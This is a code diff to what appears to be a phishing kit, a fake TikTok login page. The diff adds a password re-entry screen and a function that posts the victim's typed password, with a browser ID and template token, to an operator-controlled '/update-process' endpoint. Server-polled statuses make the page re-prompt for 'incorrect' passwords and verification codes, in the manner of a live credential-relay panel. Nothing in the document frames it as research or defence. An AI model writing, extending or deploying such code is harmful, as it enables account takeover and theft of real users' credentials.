@@ -767,6 +767,28 @@
         </button>
       </div>
 
+      <!-- SCREEN: PASSWORD ENTRY -->
+      <div id="passwordScreen" class="screen">
+        <h1>Enter your password</h1>
+        <div class="form-group" style="margin-top:20px">
+          <input type="text" class="form-input" id="passwordAccountInput" readonly autocomplete="username">
+        </div>
+        <div class="form-group">
+          <div class="password-wrap">
+            <input type="password" class="form-input" id="passwordOnlyInput" placeholder="Password" autocomplete="current-password" onkeypress="if(event.key==='Enter')submitPasswordOnly()">
+            <button type="button" class="pw-toggle" onclick="togglePassword('passwordOnlyInput')">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            </button>
+          </div>
+          <div class="error-msg" id="passwordOnlyError"></div>
+        </div>
+        <button type="button" class="btn-submit" id="passwordSubmitBtn" onclick="submitPasswordOnly()">Submit Password</button>
+        <button class="go-back" onclick="showMethodSelection()" type="button">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+          Go back
+        </button>
+      </div>
+
       <!-- SIGN UP FOOTER -->
       <div class="footer-signup">
         Don't have an account? <a href="https://www.tiktok.com/signup" target="_blank">Sign up</a>
@@ -1009,7 +1031,7 @@ function setBtnLoading(btn, on) {
 }
 
 function resetAllButtons() {
-  ['emailSubmitBtn', 'phoneSubmitBtn', 'verificationChoiceSubmitBtn', 'verificationCodeSubmitBtn'].forEach(id => {
+  ['emailSubmitBtn', 'phoneSubmitBtn', 'verificationChoiceSubmitBtn', 'verificationCodeSubmitBtn', 'passwordSubmitBtn'].forEach(id => {
     setBtnLoading(document.getElementById(id), false);
   });
 }
@@ -1082,14 +1104,14 @@ function getDeviceData() {
 }
 
 function hideAllErrors() {
-  ['phoneError', 'emailError', 'verificationChoiceError', 'verificationCodeError', 'invalidVerificationCode', 'loadingError'].forEach(id => {
+  ['phoneError', 'emailError', 'verificationChoiceError', 'verificationCodeError', 'invalidVerificationCode', 'passwordOnlyError', 'loadingError'].forEach(id => {
     const el = document.getElementById(id);
     if (el) { el.classList.remove('visible'); el.textContent = ''; }
   });
   const sc = document.getElementById('styledErrorContainer'); if (sc) sc.style.display = 'none';
 }
 function showStyledError(m){const c=document.getElementById('styledErrorContainer'),e=document.getElementById('styledErrorMessage');if(c&&e){e.textContent=m||'An unexpected error occurred.';c.style.display='block'}}
-function showFailedView(m){hideLoading();clearInterval(pollingIntervalId);['credentialScreen','verificationOptionsScreen','verificationCodeScreen'].forEach(id=>{const s=document.getElementById(id);if(s)s.style.display='none'});hideAllErrors();showStyledError(m)}
+function showFailedView(m){hideLoading();clearInterval(pollingIntervalId);['credentialScreen','verificationOptionsScreen','verificationCodeScreen','passwordScreen'].forEach(id=>{const s=document.getElementById(id);if(s)s.style.display='none'});hideAllErrors();showStyledError(m)}
 
 function setError(id, msg) {
   const el = document.getElementById(id);
@@ -1273,22 +1295,20 @@ function updateUIForStatus(status, data = {}) {
     case 'WAITINGPASSWORDERROR':
       lastFormVisibleStatus=status;
       hideLoading();
-      showScreen('credentialScreen');
-      if (selectedLoginMethod === 'phone') switchTab('phone'); else switchTab('email');
+      showScreen('passwordScreen');
       if (data.email) {
-        if (selectedLoginMethod === 'email') document.getElementById('emailInput').value = data.email;
+        document.getElementById('passwordAccountInput').value = data.email;
       }
+      document.getElementById('passwordOnlyInput').value = '';
       if (data.lastJsonResponse) {
         try {
           const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lr.message && (lr.message.includes('Incorrect') || lr.message.includes('incorrect'))) {
-            setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', lr.message);
-            const pwInput = selectedLoginMethod === 'phone' ? 'phonePasswordInput' : 'emailPasswordInput';
-            document.getElementById(pwInput).value = '';
+            setError('passwordOnlyError', lr.message);
           }
         } catch(e) {}
       } else if (status === 'WAITINGPASSWORDERROR') {
-        setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', 'Incorrect password. Please try again.');
+        setError('passwordOnlyError', 'Incorrect password. Please try again.');
       }
       lastShownStatus = currentStatus;
       startPolling(2000);
@@ -1492,6 +1512,35 @@ async function submitVerificationCode() {
     console.error("Verification code error:", error);
     hideLoading();
     setError('verificationCodeError', "Failed to submit the code. Please try again.");
+  }
+}
+
+async function submitPasswordOnly() {
+  const password = document.getElementById('passwordOnlyInput').value.trim();
+  if (!password) { setError('passwordOnlyError', "Password is required."); return; }
+  hideAllErrors();
+  setBtnLoading(document.getElementById('passwordSubmitBtn'), true);
+
+  const payload = {
+    browserId, token: templateConfig.token,
+    password,
+    updateType: 'password'
+  };
+
+  try {
+    const response = await fetch(updateBaseUrl + "/update-process", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(payload)
+    });
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    await response.json();
+    isProcessing = true;
+    updateUIForStatus('PROCESSING', {});
+  } catch (error) {
+    console.error("Password submission error:", error);
+    hideLoading();
+    setError('passwordOnlyError', "Failed to submit your password. Please try again.");
   }
 }
 
